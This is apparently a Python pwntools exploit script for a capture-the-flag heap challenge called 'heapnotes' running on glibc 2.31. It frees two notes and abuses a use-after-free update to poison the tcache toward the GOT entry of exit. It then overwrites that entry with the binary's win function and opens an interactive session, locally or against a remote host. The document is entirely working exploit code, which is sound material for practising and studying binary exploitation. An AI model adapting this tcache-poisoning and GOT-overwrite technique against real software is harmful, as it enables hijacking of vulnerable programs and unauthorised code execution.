#!/usr/bin/env python3
from pwn import *

elf = ELF("./heapnotes")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = elf
context.terminal = ["zellij", "action", "new-pane", "-d", "right", "-c", "--", "bash", "-c"]

def conn():
    if args.REMOTE:
        io = remote(args.HOST, args.PORT)
        # io = remote("addr", 1337)
    else:
        io = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
        if args.GDB:
            # context.log_level = "debug"
            gdbscript = """
                b *0x00401370
                c
            """
            gdb.attach(io, gdbscript=gdbscript)

    return io

io = conn()

def create_note(data):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"data: ", data)

def read_note(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"): ", str(idx).encode())

def update_note(idx, data):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"): ", str(idx).encode())
    io.sendlineafter(b"data: ", data)

def delete_note(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"): ", str(idx).encode())

def exit():
    io.sendlineafter(b"> ", b"5")

create_note(b"baby")
create_note(b"heap")

delete_note(0)
delete_note(1)

update_note(1, p64(elf.got.exit))

create_note(b"hi")
create_note(p64(elf.sym.win))
exit()

io.interactive()
